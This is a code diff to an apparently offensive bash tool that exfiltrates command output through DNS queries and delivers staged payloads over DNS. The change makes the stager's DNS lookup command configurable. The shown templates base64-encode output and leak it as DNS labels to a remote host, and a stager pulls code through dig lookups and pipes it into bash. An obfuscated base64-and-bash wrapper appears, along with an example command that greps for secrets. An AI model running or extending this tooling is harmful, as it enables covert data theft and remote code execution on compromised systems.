@@ -8,6 +8,7 @@ strict_label_charset=1
 outfile=/dev/stdout
 timeout=10
 threads=10
+s_dns_trigger="dig +short"
 
 signature="---procrustis--"
 trap "setsid kill -2 -- -$(ps -o pgid= $$ | grep -o [0-9]*)" EXIT
@@ -34,6 +35,7 @@ Usage:
     
     Staged Mode:
     -z NSCONFIG         The path to the script that will have dnslivery running
+    -k S_DNS_TRIGGGER   The dns trigger for the stager, defaults to: "dig +short" 
     
     Examples:
     stdbuf -oL tcpdump --immediate -l -i any udp port 53|$0 -h whatev.er -d "dig @0 +tries=5" -x dispatcher_examples/local_bash.sh -- 'ls -lha|grep secret'
@@ -133,6 +135,11 @@ while [[ $# -gt 0 ]]; do
         shift
         shift
         ;;
+        -k)
+        s_dns_trigger="$2"
+        shift
+        shift
+        ;;
         -m)
         timeout="$2"
         shift
@@ -204,7 +211,7 @@ assign sh inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|grep 
 #assign bash inner_cmd_template "((${cmd});printf '\n%SIGNATURE%')|base64 -w0|sed 's_+_-1_g; s_/_-2_g; s_=_-3_g'|grep -Eo '.{1,%LABEL_SIZE%}'|xargs -n%NLABELS% echo|tr ' ' .|nl|awk '{printf \"%s.%s%s\n\",\$2,\$1,\"%UNIQUE_DNS_HOST%\"}'|xargs -n1 bash -c '%DNS_TRIGGER% \$1&[[ \$(($(date +%N)/100000%5)) -eq 0 ]] && wait or sleep' ."
 
 ##########bash definitions#######
-assign bash stager_template 'while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(dig +short $i.%UNIQUE_DNS_HOST%);c=$(printf "%02x " ${a[*]}|xxd -r -p);done|bash'
+assign bash stager_template 'while [[ ${a[*]} != "4 4 4 4" ]];do ((i++));printf %s "$c";IFS=. read -a a < <(%S_DNS_TRIGGGER% $i.%UNIQUE_DNS_HOST%);c=$(printf "%02x " ${a[*]}|xxd -r -p);done|bash'
 
 assign bash outer_cmd_template 'bash -c {echo,%CMD_B64%}|{base64,-d}|bash'
 
@@ -259,12 +266,15 @@ else
     [[ -z $stager_template ]] && echo "Staged version for $shell is not yet supported" && exit
     inner_cmd_tmp=$(echo "$inner_cmd"|base64 -w0) #temporary encoding to avoid special chars
     tmux split-window "echo '$inner_cmd_tmp'|'$nsconfig'"
-    sleep 3
     
-    stager=${stager_template//'%UNIQUE_DNS_HOST%'/$stager_unique_dns_host}
+    stager=${stager_template}
+    stager=${stager//'%UNIQUE_DNS_HOST%'/$stager_unique_dns_host}
+    stager=${stager//'%S_DNS_TRIGGGER%'/$s_dns_trigger}
     cmd_b64=$(echo "$stager"|b64)
     echo "Stager: $stager"
     echo "Payload: $inner_cmd"
+    
+    sleep 3 #wait for nsconfig to start serving
     echo "$stager"|"$dispatcher" >/dev/null 2>&1 &
 fi
 
